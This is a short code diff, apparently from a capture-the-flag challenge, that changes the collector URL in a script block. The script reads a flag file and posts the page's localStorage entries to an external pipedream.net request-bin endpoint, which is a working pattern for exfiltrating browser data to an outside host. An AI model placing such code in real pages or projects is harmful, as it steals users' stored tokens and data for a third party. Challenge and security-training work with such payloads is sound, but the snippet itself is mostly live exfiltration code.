@@ -3,7 +3,7 @@
     <script>
       const metadata = await fs.readFile("/challenge/metadata.json").catch(() => defaultMetadata);
       const flag = JSON.parse(metadata.toString("utf-8")).flag as string
-      fetch("https://enw16o5nmiis8.x.pipedream.net/", {
+      fetch("https://eo8tb501q4j2q8z.m.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
           cool: Object.entries(localStorage),
